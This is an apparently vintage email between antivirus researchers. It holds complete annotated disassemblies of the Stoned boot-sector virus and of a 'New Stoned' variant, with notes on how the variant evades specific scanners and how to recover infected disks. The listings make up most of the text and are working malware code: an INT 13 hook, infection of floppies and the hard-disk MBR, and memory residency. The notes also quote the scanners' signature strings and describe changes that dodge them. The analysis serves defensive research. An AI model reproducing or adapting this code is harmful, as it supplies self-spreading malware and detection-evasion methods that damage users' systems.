

Okay, following this message is two disassemblies. One of the original
Stoned and one of the new strain. There is one other strain which is
slightly different (in both code and text) and that's the Donald Duck
strain. That particular one is a bit of a mix between these two. If you
like we can send that too.

> Thanks in advance! BTW, have you sent that new Cascade to McAfee or
> Skulason? Since I talk quite often with Skulason, I could send it to
> him, if you want so.

Yeah, sure go ahead. We were about to send it anyway, so I suppose you
might as well.

;       Computer Technologies NZ
;       PO Box 3598, Wellington, NEW ZEALAND
;
;       Dissasembly of the Stoned Virus
;       by S McAuliffe
;
;       This is a disassembly as if the disk has just been booted and
;       the MBR has just been read, but not yet executed.
;
07C0:0000 EA0500C007    JMP     07C0:0005
07C0:0005 E99900        JMP     00A1            ;Primary startup
07C0:0008 00            DB      00              ;Floppy/HD flag
07C0:0009 00            DB      00              ;old INT 13 vector storage
07C0:000A 00            DB      00              ; "   "  "    "       "
07C0:000B 00            DB      00              ; "   "  "    "       "
07C0:000C 00            DB      00              ; "   "  "    "       "
07C0:000D E4            DB      E4              ;Secondary startup routine
07C0:000E 00            DB      00              ; "      "       "
07C0:000F 00            DB      00              ; "      "       "
07C0:0010 00            DB      00              ; "      "       "
07C0:0011 00            DB      00              ;Location MBR loads into
07C0:0012 7C            DB      7C              ;   "      "    "    "
07C0:0013 00            DB      00              ;   "      "    "    "
07C0:0014 00            DB      00              ;   "      "    "    "
07C0:0015 1E            PUSH    DS              ;INT 13 intercept
07C0:0016 50            PUSH    AX
07C0:0017 80FC02        CMP     AH,02           ;Pass function 0 or 1
07C0:0019 7217          JB      0033
07C0:001C 80FC04        CMP     AH,04           ;Pass function 4 or above
07C0:001F 7312          JNB     0033
07C0:0021 0AD2          OR      DL,DL           ;Is it floppy A?
07C0:0023 750E          JNZ     0033            ;No, so don't infect
07C0:0025 33C0          XOR     AX,AX           ;AX=0
07C0:0027 8ED8          MOV     DS,AX           ;DS=0
07C0:0029 A03F04        MOV     AL,[043F]
07C0:002C A801          TEST    AL,01           ;Is the drive motor spinning
07C0:002E 7503          JNZ     0033            ;and LED going?
07C0:0030 E80700        CALL    003A
07C0:0033 58            POP     AX              ;Do normal function call
07C0:0034 1F            POP     DS              ;and return
07C0:0035 2E            CS:
07C0:0036 FF2E0900      JMP     FAR [0009]
07C0:003A 53            PUSH    BX              ;Save registers
07C0:003B 51            PUSH    CX
07C0:003C 52            PUSH    DX
07C0:003D 06            PUSH    ES
07C0:003E 56            PUSH    SI
07C0:003F 57            PUSH    DI
07C0:0040 BE0400        MOV     SI,0004         ;Set re-tries to 4
07C0:0043 B80102        MOV     AX,0201
07C0:0046 0E            PUSH    CS
07C0:0047 07            POP     ES
07C0:0048 BB0002        MOV     BX,0200         ;Read floppy boot sector
07C0:004B 33C9          XOR     CX,CX           ;into space after virus
07C0:004D 8BD1          MOV     DX,CX
07C0:004F 41            INC     CX
07C0:0050 9C            PUSHF
07C0:0051 2E            CS:
07C0:0052 FF1E0900      CALL    FAR [0009]      ;INT 13
07C0:0056 730E          JNB     0066            ;If no error then continue
07C0:0058 33C0          XOR     AX,AX           ;Reset floppy controller
07C0:005A 9C            PUSHF
07C0:005B 2E            CS:
07C0:005C FF1E0900      CALL    FAR [0009]      ;INT 13
07C0:0060 4E            DEC     SI              ;Keep trying until all
07C0:0061 75E0          JNZ     0043            ;retries are done
07C0:0063 EB35          JMP     009A
07C0:0065 90            NOP
07C0:0066 33F6          XOR     SI,SI
07C0:0068 BF0002        MOV     DI,0200
07C0:006B FC            CLD                     ;Set upwards direction
07C0:006C 0E            PUSH    CS
07C0:006D 1F            POP     DS              ;DS = self
07C0:006E AD            LODSW
07C0:006F 3B05          CMP     AX,[DI]         ;Is 1st word ok?
07C0:0071 7506          JNZ     0079            ;No, so infect
07C0:0073 AD            LODSW
07C0:0074 3B4502        CMP     AX,[DI+02]      ;Is 2nd word ok?
07C0:0077 7421          JZ      009A            ;Yeah, let it pass then
07C0:0079 B80103        MOV     AX,0301
07C0:007C BB0002        MOV     BX,0200         ;Make copy of original
07C0:007F B103          MOV     CL,03           ;boot sector
07C0:0081 B601          MOV     DH,01
07C0:0083 9C            PUSHF
07C0:0084 2E            CS:
07C0:0085 FF1E0900      CALL    FAR [0009]      ;INT 13
07C0:0089 720F          JB      009A            ;If error, branch
07C0:008B B80103        MOV     AX,0301
07C0:008E 33DB          XOR     BX,BX           ;Write new boot sector
07C0:0090 B101          MOV     CL,01           ;with virus
07C0:0092 33D2          XOR     DX,DX
07C0:0094 9C            PUSHF
07C0:0095 2E            CS:
07C0:0096 FF1E0900      CALL    FAR [0009]      ;INT 13
07C0:009A 5F            POP     DI
07C0:009B 5E            POP     SI
07C0:009C 07            POP     ES              ;Restore and return
07C0:009D 5A            POP     DX
07C0:009E 59            POP     CX
07C0:009F 5B            POP     BX
07C0:00A0 C3            RET
07C0:00A1 33C0          XOR     AX,AX           ;Primary startup routine
07C0:00A3 8ED8          MOV     DS,AX           ;AX=0 and DS=0
07C0:00A5 FA            CLI                     ;Prevent interrupts
07C0:00A6 8ED0          MOV     SS,AX           ;SS=0
07C0:00A8 BC007C        MOV     SP,7C00         ;SP points to MBR
07C0:00AB FB            STI                     ;Allow interrupts again
07C0:00AC A14C00        MOV     AX,[004C]       ;Get INT 13 vectors
07C0:00AF A3097C        MOV     [7C09],AX       ;and store
07C0:00B2 A14E00        MOV     AX,[004E]
07C0:00B5 A30B7C        MOV     [7C0B],AX
07C0:00B8 A11304        MOV     AX,[0413]
07C0:00BB 48            DEC     AX              ;Reduce high memory by 128
07C0:00BC 48            DEC     AX              ;paragraphs so virus isn't
07C0:00BD A31304        MOV     [0413],AX       ;overwritten
07C0:00C0 B106          MOV     CL,06
07C0:00C2 D3E0          SHL     AX,CL           ;Calculate address for virus
07C0:00C4 8EC0          MOV     ES,AX
07C0:00C6 A30F7C        MOV     [7C0F],AX
07C0:00C9 B81500        MOV     AX,0015         ;Offset of intercept
07C0:00CC A34C00        MOV     [004C],AX       ;Set INT 13 to intercept
07C0:00CF 8C064E00      MOV     [004E],ES
07C0:00D3 B9B801        MOV     CX,01B8         ;For length of virus w/ msg
07C0:00D6 0E            PUSH    CS
07C0:00D7 1F            POP     DS              ;Set DS to self
07C0:00D8 33F6          XOR     SI,SI           ;SI=0
07C0:00DA 8BFE          MOV     DI,SI           ;DI=0
07C0:00DC FC            CLD                     ;Set upwards direction
07C0:00DD F3            REPZ                    ;Copy virus to new
07C0:00DE A4            MOVSB                   ;location (high memory)
07C0:00DF 2E            CS:
07C0:00E0 FF2E0D00      JMP     FAR [000D]      ;Continue in copy of virus
07C0:00E4 B80000        MOV     AX,0000         ;now in high memory
07C0:00E7 CD13          INT     13              ;Reset drives
07C0:00E9 33C0          XOR     AX,AX
07C0:00EB 8EC0          MOV     ES,AX
07C0:00ED B80102        MOV     AX,0201
07C0:00F0 BB007C        MOV     BX,7C00         ;Set up to read old boot
07C0:00F3 2E            CS:                     ;sector/MBR over old copy
07C0:00F4 803E080000    CMP     BYTE PTR [0008],00 ;Booting from floppy?
07C0:00F9 740B          JZ      0106
07C0:00FB B90700        MOV     CX,0007         ;Read original HD MBR
07C0:00FE BA8000        MOV     DX,0080         ;from space in MBR track
07C0:0101 CD13          INT     13
07C0:0103 EB49          JMP     014E            ;Don't print message
07C0:0105 90            NOP
07C0:0106 B90300        MOV     CX,0003         ;Read original floppy boot
07C0:0109 BA0001        MOV     DX,0100         ;sector
07C0:010C CD13          INT     13
07C0:010E 723E          JB      014E            ;Don't print if error
07C0:0110 26            ES:
07C0:0111 F6066C0407    TEST    BYTE PTR [046C],07 ;Shall we print message?
07C0:0116 7512          JNZ     012A
07C0:0118 BE8901        MOV     SI,0189         ;Start of message
07C0:011B 0E            PUSH    CS
07C0:011C 1F            POP     DS
07C0:011D AC            LODSB                   ;Message printing routine
07C0:011E 0AC0          OR      AL,AL
07C0:0120 7408          JZ      012A            ;Done if ends in 0
07C0:0122 B40E          MOV     AH,0E
07C0:0124 B700          MOV     BH,00
07C0:0126 CD10          INT     10              ;Print character
07C0:0128 EBF3          JMP     011D            ;Keep going
07C0:012A 0E            PUSH    CS
07C0:012B 07            POP     ES              ;ES points to self
07C0:012C B80102        MOV     AX,0201         ;Read current MBR from HD
07C0:012F BB0002        MOV     BX,0200         ;Load into spare space
07C0:0132 B101          MOV     CL,01           ;after virus
07C0:0134 BA8000        MOV     DX,0080
07C0:0137 CD13          INT     13
07C0:0139 7213          JB      014E            ;Error (no HD)
07C0:013B 0E            PUSH    CS
07C0:013C 1F            POP     DS
07C0:013D BE0002        MOV     SI,0200
07C0:0140 BF0000        MOV     DI,0000         ;See if HD is already infected
07C0:0143 AD            LODSW
07C0:0144 3B05          CMP     AX,[DI]         ;Is first word alright?
07C0:0146 7511          JNZ     0159            ;No, not infected yet
07C0:0148 AD            LODSW
07C0:0149 3B4502        CMP     AX,[DI+02]      ;Is next word alright?
07C0:014C 750B          JNZ     0159            ;No, not infected yet
07C0:014E 2E            CS:
07C0:014F C606080000    MOV     BYTE PTR [0008],00 ;Set flag for floppy
07C0:0154 2E            CS:
07C0:0155 FF2E1100      JMP     FAR [0011]      ;Boot normal MBR
07C0:0159 2E            CS:
07C0:015A C606080002    MOV     BYTE PTR [0008],02 ;Set HD flag
07C0:015F B80103        MOV     AX,0301
07C0:0162 BB0002        MOV     BX,0200
07C0:0165 B90700        MOV     CX,0007         ;Write old MBR to
07C0:0168 BA8000        MOV     DX,0080         ;space in MBR track
07C0:016B CD13          INT     13
07C0:016D 72DF          JB      014E            ;Disk error
07C0:016F 0E            PUSH    CS
07C0:0170 1F            POP     DS              ;DS = self
07C0:0171 0E            PUSH    CS
07C0:0172 07            POP     ES              ;ES = self
07C0:0173 BEBE03        MOV     SI,03BE
07C0:0176 BFBE01        MOV     DI,01BE
07C0:0179 B94202        MOV     CX,0242
07C0:017C F3            REPZ                    ;Copy partition table
07C0:017D A4            MOVSB                   ;and erase old copy from memory
07C0:017E B80103        MOV     AX,0301
07C0:0181 33DB          XOR     BX,BX           ;Write virus over old MBR
07C0:0183 FEC1          INC     CL
07C0:0185 CD13          INT     13
07C0:0187 EBC5          JMP     014E            ;Done
07C0:0189               DB      07
07C0:018A               DB      'Your PC is now Stoned!'
07C0:01A0               DB      07,0D,0A,0A
07C0:01A4               DB      ' LEGALISE MARIJUANA!'
07C0:01B8               DB      0

; The remaining space in the sector is unused by the virus. The bytes from
; offset 1BE to 1FF are reserved for the partition table when infecting
; hard drives (so that the drive is still usable). The bytes from 1B9 to
; 1BD are not used by anything.



;       Computer Technologies NZ
;       PO Box 3598, Wellington, NEW ZEALAND
;
;       Dissasembly of the New Stoned Virus
;       by S McAuliffe
;
;       This is a disassembly as if the disk has just been booted and
;       the MBR has just been read, but not yet executed.
;
;       Changes from the original are shown in square brackets
;
07C0:0000 EAA100C007    JMP     07C0:00A1
07C0:0005 E99900        JMP     00A1            ;Primary startup
07C0:0008 00            DB      00              ;Floppy/HD flag
07C0:0009 00            DB      00              ;old INT 13 vector storage
07C0:000A 00            DB      00              ; "   "  "    "       "
07C0:000B 00            DB      00              ; "   "  "    "       "
07C0:000C 00            DB      00              ; "   "  "    "       "
07C0:000D E4            DB      E4              ;Secondary startup routine
07C0:000E 00            DB      00              ; "      "       "
07C0:000F 00            DB      00              ; "      "       "
07C0:0010 00            DB      00              ; "      "       "
07C0:0011 00            DB      00              ;Location MBR loads into
07C0:0012 7C            DB      7C              ;   "      "    "    "
07C0:0013 00            DB      00              ;   "      "    "    "
07C0:0014 00            DB      00              ;   "      "    "    "
07C0:0015 50            PUSH    AX              ;INT 13 intercept
07C0:0016 1E            PUSH    DS              ;[Order changed]
07C0:0017 80FC02        CMP     AH,02           ;Pass function 0 or 1
07C0:0019 7217          JB      0033
07C0:001C 80FC04        CMP     AH,04           ;Pass function 4 or above
07C0:001F 7312          JNB     0033
07C0:0021 0AD2          OR      DL,DL           ;Is it floppy A?
07C0:0023 750E          JNZ     0033            ;No, so don't infect
07C0:0025 33C0          XOR     AX,AX           ;AX=0
07C0:0027 8ED8          MOV     DS,AX           ;DS=0
07C0:0029 A03F04        MOV     AL,[043F]
07C0:002C A801          TEST    AL,01           ;Is the drive motor spinning
07C0:002E 7503          JNZ     0033            ;and LED going?
07C0:0030 E80700        CALL    003A
07C0:0033 1F            POP     DS              ;Do normal function call
07C0:0034 58            POP     AX              ;and return [Order changed]
07C0:0035 2E            CS:
07C0:0036 FF2E0900      JMP     FAR [0009]
07C0:003A 51            PUSH    CX              ;Save registers
07C0:003B 53            PUSH    BX              ;[Order changed]
07C0:003C 52            PUSH    DX
07C0:003D 06            PUSH    ES
07C0:003E 56            PUSH    SI
07C0:003F 57            PUSH    DI
07C0:0040 BE0400        MOV     SI,0004         ;Set re-tries to 4
07C0:0043 B80102        MOV     AX,0201
07C0:0046 0E            PUSH    CS
07C0:0047 07            POP     ES
07C0:0048 BB0002        MOV     BX,0200         ;Read floppy boot sector
07C0:004B 33C9          XOR     CX,CX           ;into space after virus
07C0:004D 8BD1          MOV     DX,CX
07C0:004F 41            INC     CX
07C0:0050 9C            PUSHF
07C0:0051 2E            CS:
07C0:0052 FF1E0900      CALL    FAR [0009]      ;INT 13
07C0:0056 730D          JNB     0065            ;[Address changed]
07C0:0058 33C0          XOR     AX,AX           ;Reset floppy controller
07C0:005A 9C            PUSHF
07C0:005B 2E            CS:
07C0:005C FF1E0900      CALL    FAR [0009]      ;INT 13
07C0:0060 4E            DEC     SI              ;Keep trying until all
07C0:0061 75E0          JNZ     0043            ;retries are done
07C0:0063 EB35          JMP     009A
07C0:0065 BE0300        MOV     SI,0003         ;[Changed]
07C0:0068 BF0302        MOV     DI,0203         ;[Changed]
07C0:006B FC            CLD                     ;Set upwards direction
07C0:006C 0E            PUSH    CS
07C0:006D 1F            POP     DS              ;DS = self
07C0:006E AD            LODSW
07C0:006F 3B05          CMP     AX,[DI]         ;Is 1st word ok?
07C0:0071 7506          JNZ     0079            ;No, so infect
07C0:0073 AD            LODSW
07C0:0074 3B4502        CMP     AX,[DI+02]      ;Is 2nd word ok?
07C0:0077 7421          JZ      009A            ;Yeah, let it pass then
07C0:0079 B80103        MOV     AX,0301
07C0:007C BB0002        MOV     BX,0200         ;Make copy of original
07C0:007F B103          MOV     CL,03           ;boot sector
07C0:0081 B601          MOV     DH,01
07C0:0083 9C            PUSHF
07C0:0084 2E            CS:
07C0:0085 FF1E0900      CALL    FAR [0009]      ;INT 13
07C0:0089 720F          JB      009A            ;If error, branch
07C0:008B B80103        MOV     AX,0301
07C0:008E 33DB          XOR     BX,BX           ;Write new boot sector
07C0:0090 B101          MOV     CL,01           ;with virus
07C0:0092 33D2          XOR     DX,DX
07C0:0094 9C            PUSHF
07C0:0095 2E            CS:
07C0:0096 FF1E0900      CALL    FAR [0009]      ;INT 13
07C0:009A 5F            POP     DI
07C0:009B 5E            POP     SI
07C0:009C 07            POP     ES              ;Restore and return
07C0:009D 5A            POP     DX
07C0:009E 5B            POP     BX
07C0:009F 59            POP     CX              ;[Swapped]
07C0:00A0 C3            RET
07C0:00A1 33C0          XOR     AX,AX           ;Primary startup routine
07C0:00A3 8ED8          MOV     DS,AX           ;AX=0 and DS=0
07C0:00A5 FA            CLI                     ;Prevent interrupts
07C0:00A6 8ED0          MOV     SS,AX           ;SS=0
07C0:00A8 BC007C        MOV     SP,7C00         ;SP points to MBR
07C0:00AB FB            STI                     ;Allow interrupts again
07C0:00AC A14C00        MOV     AX,[004C]       ;Get INT 13 vectors
07C0:00AF A3097C        MOV     [7C09],AX       ;and store
07C0:00B2 A14E00        MOV     AX,[004E]
07C0:00B5 A30B7C        MOV     [7C0B],AX
07C0:00B8 A11304        MOV     AX,[0413]
07C0:00BB 48            DEC     AX              ;Reduce high memory by 128
07C0:00BC 48            DEC     AX              ;paragraphs so virus isn't
07C0:00BD A31304        MOV     [0413],AX       ;overwritten
07C0:00C0 B106          MOV     CL,06
07C0:00C2 D3E0          SHL     AX,CL           ;Calculate address for virus
07C0:00C4 8EC0          MOV     ES,AX
07C0:00C6 A30F7C        MOV     [7C0F],AX
07C0:00C9 B81500        MOV     AX,0015         ;Offset of intercept
07C0:00CC A34C00        MOV     [004C],AX       ;Set INT 13 to intercept
07C0:00CF 8C064E00      MOV     [004E],ES
07C0:00D3 B9B801        MOV     CX,01B8         ;For length of virus w/ msg
07C0:00D6 0E            PUSH    CS
07C0:00D7 1F            POP     DS              ;Set DS to self
07C0:00D8 33F6          XOR     SI,SI           ;SI=0
07C0:00DA 8BFE          MOV     DI,SI           ;DI=0
07C0:00DC FC            CLD                     ;Set upwards direction
07C0:00DD F3            REPZ                    ;Copy virus to new
07C0:00DE A4            MOVSB                   ;location (high memory)
07C0:00DF 2E            CS:
07C0:00E0 FF2E0D00      JMP     FAR [000D]      ;Continue in copy of virus
07C0:00E4 B80000        MOV     AX,0000         ;now in high memory
07C0:00E7 CD13          INT     13              ;Reset drives
07C0:00E9 33C0          XOR     AX,AX
07C0:00EB 8EC0          MOV     ES,AX
07C0:00ED B80102        MOV     AX,0201
07C0:00F0 BB007C        MOV     BX,7C00         ;Set up to read old boot
07C0:00F3 2E            CS:                     ;sector/MBR over old copy
07C0:00F4 803E080000    CMP     BYTE PTR [0008],00 ;Booting from floppy?
07C0:00F9 740B          JZ      0106
07C0:00FB B90700        MOV     CX,0007         ;Read original HD MBR
07C0:00FE BA8000        MOV     DX,0080         ;from space in MBR track
07C0:0101 CD13          INT     13
07C0:0103 EB49          JMP     014E            ;Don't print message
07C0:0105 90            NOP
07C0:0106 B90300        MOV     CX,0003         ;Read original floppy boot
07C0:0109 BA0001        MOV     DX,0100         ;sector
07C0:010C CD13          INT     13
07C0:010E 723E          JB      014E            ;Don't print if error
07C0:0110 26            ES:
07C0:0111 F6066C041F    TEST    BYTE PTR [046C],1F ;Shall we print message?
07C0:0116 7512          JNZ     012A            ;[Probability changed]
07C0:0118 BE8901        MOV     SI,0189         ;Start of message
07C0:011B 0E            PUSH    CS
07C0:011C 1F            POP     DS
07C0:011D AC            LODSB                   ;Message printing routine
07C0:011E 0AC0          OR      AL,AL
07C0:0120 7408          JZ      012A            ;Done if ends in 0
07C0:0122 B40E          MOV     AH,0E
07C0:0124 B700          MOV     BH,00
07C0:0126 CD10          INT     10              ;Print character
07C0:0128 EBF3          JMP     011D            ;Keep going
07C0:012A 0E            PUSH    CS
07C0:012B 07            POP     ES              ;ES points to self
07C0:012C B80102        MOV     AX,0201         ;Read current MBR from HD
07C0:012F BB0002        MOV     BX,0200         ;Load into spare space
07C0:0132 B101          MOV     CL,01           ;after virus
07C0:0134 BA8000        MOV     DX,0080
07C0:0137 CD13          INT     13
07C0:0139 7213          JB      014E            ;Error (no HD)
07C0:013B 0E            PUSH    CS
07C0:013C 1F            POP     DS
07C0:013D BE0302        MOV     SI,0203         ;[Changed]
07C0:0140 BF0300        MOV     DI,0003         ;See if HD is already infected
07C0:0143 AD            LODSW
07C0:0144 3B05          CMP     AX,[DI]         ;Is first word alright?
07C0:0146 7511          JNZ     0159            ;No, not infected yet
07C0:0148 AD            LODSW
07C0:0149 3B4502        CMP     AX,[DI+02]      ;Is next word alright?
07C0:014C 750B          JNZ     0159            ;No, not infected yet
07C0:014E 2E            CS:
07C0:014F C606080000    MOV     BYTE PTR [0008],00 ;Set flag for floppy
07C0:0154 2E            CS:
07C0:0155 FF2E1100      JMP     FAR [0011]      ;Boot normal MBR
07C0:0159 2E            CS:
07C0:015A C606080002    MOV     BYTE PTR [0008],02 ;Set HD flag
07C0:015F B80103        MOV     AX,0301
07C0:0162 BB0002        MOV     BX,0200
07C0:0165 B90700        MOV     CX,0007         ;Write old MBR to
07C0:0168 BA8000        MOV     DX,0080         ;space in MBR track
07C0:016B CD13          INT     13
07C0:016D 72DF          JB      014E            ;Disk error
07C0:016F 0E            PUSH    CS
07C0:0170 1F            POP     DS              ;DS = self
07C0:0171 0E            PUSH    CS
07C0:0172 07            POP     ES              ;ES = self
07C0:0173 BEBE03        MOV     SI,03BE
07C0:0176 BFBE01        MOV     DI,01BE
07C0:0179 B94202        MOV     CX,0242
07C0:017C F3            REPZ                    ;Copy partition table
07C0:017D A4            MOVSB                   ;and erase old copy from memory
07C0:017E B80103        MOV     AX,0301
07C0:0181 33DB          XOR     BX,BX           ;Write virus over old MBR
07C0:0183 FEC1          INC     CL
07C0:0185 CD13          INT     13
07C0:0187 EBC5          JMP     014E            ;Done
07C0:0189               DB      07,07,07,0A,0A,0A
07C0:018F               DB      'Your PC is now Stoned!'
07C0:01A5               DB      0D,0A,0A
07C0:01A8               DB      'Version 2'
07C0:01B1               DB      0D,0A,0A,0A,07,07,07
07C0:01B8               DB      0

; This new strain of the stoned virus has the following changes:
;
; The jump at the beginning is changed to jump directly to the virus code.
; This prevents KILLER/PILL etc etc from finding it. These detectors use
; the check bytes EA 05 00 C0 at the beginning of the virus. These are the
; the same bytes as the virus itself uses, except that the virus doesn't
; check if those are the correct values, it simply compares the bytes with
; itself.
;
; The order the registers are pushed to the stack is changed in two places.
; The first (at offset 15h) is to prevent VBUSTER from locating it. The second
; (at offset 3Ah) is to prevent SCAN from finding it. The corresponding POP
; instructions are also swapped. SCAN uses the scan string 00 53 51 52 06 56 57
; and VBUSTER uses 1E 50 80 FC 02 72 17 80 FC 04 73 12 0A D2 75 0E 33 C0 8E
; D8 A0 3F 04 A8 01 75 03 E8 07 00 (in other words, the entire INT 13
; intercept routine!)
;
; The activation probability has been changed from one in 8 to one in 32.
; The message only comes up when booting floppies, not when booting from
; a hard drive (as in the original).
;
; The message has been changed.
;
; Some other code has been added/modified. This seems to be to prevent the
; virus conflicting with other strains of the stoned virus. It prevents
; the computer from "dieing" when it comes in to contact with a disk already
; infected with the original stoned virus. It does NOT prevent conflicts if
; the host disk is infected with this strain and the original virus tries
; to re-infect the disk. If that should happen, the original copy of the
; boot sector/MBR is lost completely and replaced with the new strain of the
; virus. Then when the disk is booted, the original virus strain loads into
; memory first and reduces available memory by 2K. This then loads the new
; strain into memory and reduces memory by another 2K. Now, instead of loading
; the original boot sector, it re-loads itself and reduces memory by yet
; another 2K. This carries on, with the virus being loaded at a lower memory
; location each time until finally it is loaded over critical sections of
; memory (such as interrupt vector tables!) at which time everything comes
; to a halt and a cold boot is needed. To make the disk re-bootable, the
; Boot sector/MBR must be replaced. For floppies, restoring the boot sector
; can be done with the SYS command or simply copy the files onto a new disk.
; For the hard drive, the MBR must be replaced from a backup or else the
; files copied and the entire drive re-formatted. Fortunately, no files need
; be lost because the partition table will still be intact. Keeping a copy
; of the MBR in the following sector (which is unused) can be useful, you
; only need to run a utility like Norton Utilities and copy the sector back
; over the infected sector.

